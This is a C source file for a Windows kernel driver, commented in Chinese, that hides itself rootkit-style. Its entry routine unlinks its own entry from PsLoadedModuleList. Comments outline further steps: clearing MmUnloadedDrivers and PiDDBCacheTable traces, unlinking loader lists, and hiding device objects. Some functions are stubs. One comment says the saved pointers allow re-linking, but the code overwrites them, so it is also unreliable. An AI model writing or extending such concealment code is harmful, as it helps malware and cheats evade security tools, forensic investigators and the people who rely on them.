#include <ntifs.h>

typedef struct _PEB_LDR_DATA_ {
    ULONG Length; BOOLEAN Initialized; PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_, *PPEB_LDR_DATA_;

typedef struct _FULL_LDR_DATA_TABLE_ENTRY_ {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} FULL_LDR_DATA_TABLE_ENTRY_, *PFULL_LDR_DATA_TABLE_ENTRY_;

/* 1) 从 PsLoadedModuleList 摘链：找到自己那一条，Unlink */
NTSTATUS HideFromPsLoadedModuleList(PVOID ImageBase)
{
    PLIST_ENTRY head = &PsLoadedModuleList;
    PLIST_ENTRY cur  = head->Flink;
    while (cur != head) {
        PKLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (entry->DllBase == ImageBase) {
            /* 保留前后指针，卸载时能原样挂回 */
            RemoveEntryList(&entry->InLoadOrderLinks);
            InitializeListHead(&entry->InLoadOrderLinks); /* 防遍历崩 */
            return STATUS_SUCCESS;
        }
        cur = cur->Flink;
    }
    return STATUS_NOT_FOUND;
}

/* 2) 用户态模块链（r3 枚举驱动时走 Ldr）——同上逻辑，
 *    在 System 进程的 PEB->Ldr 里找自己这条 FULL_LDR_DATA_TABLE_ENTRY_
 *    然后 RemoveEntryList 三条链（Load/InMemory/InInitOrder）
 */

/* 3) 清 MmUnloadedDrivers / PiDDBCacheTable 里的记录 */
/* MmUnloadedDrivers: 未导出，特征定位后把本驱动对应项清 0
 * PiDDBCacheTable: RtlAVL 树里按 DriverName 匹配，删节点
 * 这两处先用特征码定位地址，再动手
 */

/* 4) 隐藏设备对象与符号链接 */
NTSTATUS HideDeviceAndSymlink(PDRIVER_OBJECT pdo, PDEVICE_OBJECT dev)
{
    /* 从对象目录里摘掉设备名，符号链接同理 */
    UNICODE_STRING devName;
    RtlInitUnicodeString(&devName, L"\\Device\\[驱动设备名]");
    /* ObOpenObjectByName + 摘链，或直接 NULL 掉 DevObj->DriverObject 关联 */
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
{
    PVOID imageBase = drv->DriverStart;
    HideFromPsLoadedModuleList(imageBase);
    /* 下一步再接 MmUnloadedDrivers / PiDDBCacheTable 清理和句柄剥权限 */
    return STATUS_SUCCESS;
}
